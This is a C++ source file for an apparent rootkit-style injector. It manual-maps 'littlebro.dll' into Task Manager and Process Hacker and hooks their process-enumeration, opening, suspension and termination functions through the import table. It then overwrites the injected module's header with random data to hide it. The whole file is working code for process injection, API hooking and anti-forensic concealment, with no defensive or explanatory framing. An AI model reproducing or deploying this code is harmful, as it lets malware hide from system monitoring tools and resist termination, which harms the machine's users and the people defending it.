#include "stdafx.h"
#include "ntdll.hpp"

using hook_container = std::vector<std::tuple<std::string, std::string, const char*>>;

int main()
{
	// INITIALISE DYNAMIC IMPORTS
	ntdll::initialise();

	// READ LITTLEBRO FROM DISK FOR INJECTION
	auto littlebro_buffer = binary_file::read_file("littlebro.dll");

	// SETUP HOOK CONTAINER
	// FORMAT: MODULE NAME, FUNCTION NAME, EXPORT NAME
	hook_container container =
	{
		{ "kernel32.dll", "GetProcAddress", "gpa" },
		{ "kernel32.dll", "TerminateProcess", "kterm" },
		{ "kernel32.dll", "OpenProcess", "op" },
		{ "kernel32.dll", "K32EnumProcesses", "enump" },
		{ "ntdll.dll", "NtTerminateProcess", "ntterm" },
		{ "ntdll.dll", "NtSuspendProcess", "ntsusp" },
		{ "ntdll.dll", "NtOpenProcess", "ntop" },
		{ "ntdll.dll", "NtQuerySystemInformation", "qsi" }
	};

	for (const auto& process_name : { "taskmgr.exe", "ProcessHacker.exe" })
	{
		auto process_list = process::get_all_from_name(process_name);

		if (process_list.empty()) // NO PROCESSES FOUND
			continue;

		// ENUMERATE ALL PROCESSES
		for (auto id : process_list)
		{
			logger::log_formatted("Target Process", process_name);

			auto proc = process(id, PROCESS_ALL_ACCESS);
			auto injector = injection::manualmap(proc);

			// MAP LITTLEBRO INTO TARGET PROCESS
			auto littlebro = injector.inject(littlebro_buffer);

			// HOOK REMOTE FUNCTIONS BY REPLACING THE RESPECTIVE IMPORT ADDRESS TABLE
			// ENTRIES WITH OUR OWN PROTECTIVE HOOKS, EXPORTED BY LITTLEBRO

			// HOOK FUNCTIONS
			for (const auto [module_name, function_name, export_name] : container)
				proc.hook_function(module_name, function_name, proc.get_module_export(littlebro, export_name));

			// FILL HEADER SECTION WITH PSEUDO-RANDOM DATA WITH HIGH ENTROPY
			auto junk_buffer = std::vector<std::uint8_t>(0x1000);
			std::for_each(junk_buffer.begin(), junk_buffer.end(), [](auto& n) { n = rand() % 0x100; });
			proc.write_raw_memory(junk_buffer.data(), 0x1000, littlebro);
		}
	}

	std::cin.get();
    return 0;
}

